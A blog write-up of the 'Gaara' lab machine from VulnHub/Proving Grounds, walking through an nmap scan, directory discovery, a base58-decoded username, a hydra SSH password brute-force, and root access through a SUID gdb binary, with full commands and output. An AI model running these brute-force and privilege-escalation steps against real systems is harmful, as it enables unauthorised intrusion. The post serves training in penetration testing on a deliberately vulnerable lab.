---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/gaara-1,629/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery
Performing a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p22,80 -sV 192.168.55.142
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 16:27 EST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 16:28 (0:00:07 remaining)
Nmap scan report for 192.168.55.142
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

## dir busting
Use `gobuster` or another dir busting tool to identify 'hidden' resources on the web server on port 80.

> The resource `/Cryoserver` can be identified
{: .prompt-info}

Requesting the resource exposes other resources to check.
- `/Temari`
- `/Kazekage`
- `/iamGaara`

Requesting `http://192.168.55.142/iamGaara` exposes a list of strings. The following string catches our attention:  
`f1MgN9mTf9SNbzRygcU`

> Trying to decode that string with `echo 'f1MgN9mTf9SNbzRygcU' | base64 -d` does not work, so it does not seem to be `base64`
{: .prompt-danger}

Playing around with [`cyberchef`](https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&input=ZjFNZ045bVRmOVNOYnpSeWdjVQ) reveals that it is `base58` encoded.  

> The decoded text is `gaara:ismyname` and indicates that `gaara` may be a system account.
{: .prompt-info}

---

# exploitation
We are using `hydra` to check if `gaara` used a weak password.
```bash
$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt -V 192.168.55.142 ssh
```
> It worked! `gaara` uses the password `iloveyou2`.
{: .prompt-info}

---

# post exploitation
## log in via `ssh` and get first flag
```bash
$ ssh gaara@192.168.55.142                                           
gaara@192.168.55.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 20 16:38:23 2022 from 192.168.49.55

gaara@Gaara:~$ pwd
/home/gaara
gaara@Gaara:~$ cat local.txt 
a******************************1
```

## privilege escalation
### looking for `SUID` binaries owned by `root`
```bash
gaara@Gaara:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-sr-x 1 root root 7570720 Dec 24  2018 /usr/bin/gimp-2.10
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwxr-sr-x 1 root ssh 321672 Jan 31  2020 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
```

> Analyzing the output and checking the binaries on [gtfobins](https://gtfobins.github.io/gtfobins/gdb/#suid) shows that `gdb` can be exploited to get `root` access.
{: .prompt-info}

### exploiting `gdb` to get `root` access
```bash
gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
```

> Root! =)
{: .prompt-info}

## get second flag
```bash
# cd /root      
# ls
proof.txt  root.txt
# cat proof.txt
6******************************6
```

Pwned! <@:-)
